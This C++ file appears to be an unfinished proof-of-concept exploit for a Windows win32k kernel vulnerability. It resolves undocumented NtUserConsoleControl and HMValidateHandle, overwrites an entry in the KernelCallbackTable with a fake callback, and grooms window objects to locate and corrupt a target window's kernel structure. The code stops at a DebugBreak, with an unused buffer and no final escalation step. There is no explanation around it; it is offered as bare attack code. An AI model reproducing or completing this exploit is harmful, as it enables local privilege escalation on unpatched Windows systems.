#include <Windows.h>
#include <stdio.h>

typedef NTSTATUS  (*pNtCallbackReturn)     (PVOID Result OPTIONAL, ULONG ResultLength, NTSTATUS Status);
typedef NTSTATUS  (*pNtUserConsoleControl) (ULONG64 ConsoleCtrl, PVOID ConsoleCtrlInfo, ULONG ConsoleCtrlInfoLength);
typedef ULONG64   (*pHMValidateHandle)     (HMENU hMenu, BYTE hType);
typedef VOID      (*pCallBack)             (PULONG32 para);

namespace global
{
	ULONG32 magicNum = 0xabcd;
	HWND hWnds[20] = { 0 };
	ULONG64 pWnds[20] = { 0 };
	BOOL flag = FALSE;
	pCallBack orginCallBack = nullptr;
	pHMValidateHandle HMValidateHandle = nullptr;
	pNtCallbackReturn NtCallbackReturn = nullptr;
	pNtUserConsoleControl NtUserConsoleControl = nullptr;
}

void ErrorOutput(const char* msg)
{
	printf(msg);
	printf("[-] Error code: %d\n", GetLastError());
	exit(1);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

VOID InitFunction()
{
	HMODULE hNtdll = LoadLibraryA("ntdll.dll"), hWin = LoadLibraryA("win32u.dll"), hUser = LoadLibraryA("user32.dll");
	
	if (!hNtdll || !hWin || !hUser)
	{
		ErrorOutput("[-] Failed to load the ntdll.dll, win32u.dll, user32.dll\n");
	}

	global::NtCallbackReturn = (pNtCallbackReturn)GetProcAddress(hNtdll, "NtCallbackReturn");
	global::NtUserConsoleControl = (pNtUserConsoleControl)GetProcAddress(hWin, "NtUserConsoleControl");
	if (!global::NtCallbackReturn || !global::NtUserConsoleControl)
	{
		ErrorOutput("[-] Failed to get NtCallbackReturn, NtUserConsoleControl\n");
	}

	PBYTE isMenu = (PBYTE)GetProcAddress(hUser, "IsMenu");
	if (!isMenu)
	{
		ErrorOutput("[-] Failed to get NtCallbackReturn, NtUserConsoleControl\n");
	}

	while (*isMenu++ != 0xe8);
	global::HMValidateHandle = (pHMValidateHandle)(isMenu + 4 +  (*(PLONG32)isMenu) );

	if (!global::HMValidateHandle)
	{
		ErrorOutput("[-] Failed to get HMValidateHandle\n");
	}
}

VOID FakeCallBack(PULONG32 para)
{
	if (*para == global::magicNum && global::flag)
	{
		printf("[+] Enter the fake callback\n");
		HWND target = NULL;
		
		for (ULONG32 idx = 2; idx < 20; ++idx)
		{
			if (*(PULONG64)(global::pWnds[idx] + 0xc8) == global::magicNum)
			{
				target = (HWND)*(PULONG64)global::pWnds[idx];
				printf("[+] Find the target wnd handle: 0x%I64x\n", (ULONG64)target);
				printf("[+] Find the target wnd address: 0x%I64x\n", (ULONG64)global::pWnds[idx]);
				break;
			}
		}

		Sleep(200);
		DebugBreak();

		// set flag
		ULONG64 buffer1[2] = { (ULONG64)target, 0 };
		global::NtUserConsoleControl(6, buffer1, 0x10);

		// set offset
		ULONG64 buffer2[3] = { 0xffffffff, 0, 0 };
		ULONG64 heap = (ULONG64)HeapAlloc(GetProcessHeap(), 8, *para);

	}

	return global::orginCallBack(para);
}

VOID HookCallBack()
{
	ULONG64 KernelCallbackTable = *(PULONG64)(__readgsqword(0x60) + 0x58);
	if (!KernelCallbackTable)
	{
		printf("[-] Failed to get kernel callback table\n");
		exit(1);
	}
	
	DWORD oldProtect = 0;
	ULONG64 target = KernelCallbackTable + (0x7B * 8);

	VirtualProtect((LPVOID)target, 0x100, PAGE_EXECUTE_READWRITE, &oldProtect);

	global::orginCallBack = (pCallBack)(*(PULONG64)target);
	*(PULONG64)target = (ULONG64)FakeCallBack;
	
	VirtualProtect((LPVOID)target, 0x100, oldProtect, &oldProtect);
}

int main()
{
	InitFunction();
	HookCallBack();

	HINSTANCE hInstance = GetModuleHandleA(NULL);
	WNDCLASSA wc{ 0 };
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = "Normal";
	wc.cbWndExtra = 0x10;

	ATOM normalClass = RegisterClassA(&wc);
	if (!normalClass)
	{
		ErrorOutput("[-] Failed to register normal class\n");
	}

	wc.lpszClassName = "Magic";
	wc.cbWndExtra = global::magicNum;
	ATOM magicClass = RegisterClassA(&wc);
	if (!magicClass)
	{
		ErrorOutput("[-] Failed to register magic class\n");
	}

	for (ULONG32 idx = 0; idx < 20; ++idx)
	{
		global::hWnds[idx] = CreateWindowExA(0x8000000, "Normal", "NormalWnd", 0x8000000, 0, 0, 0, 0, 0, 0, hInstance, NULL);
		if (!global::hWnds[idx])
		{
			ErrorOutput("[-] Failed to create normal window\n");
		}
		global::pWnds[idx] = global::HMValidateHandle((HMENU)global::hWnds[idx], 1);
	}

	for (ULONG32 idx = 2; idx < 20; ++idx)
	{
		if (global::hWnds[idx])
		{
			DestroyWindow(global::hWnds[idx]);
		}
	}
	
	global::flag = TRUE;
	HWND hMagic = CreateWindowExA(0x8000000, "Magic", "MagicWnd", 0x8000000, 0, 0, 0, 0, 0, 0, hInstance, NULL);
	if (!hMagic)
	{
		ErrorOutput("[-] Failed to create magic window\n");
	}

	DestroyWindow(hMagic);
	return 0;
}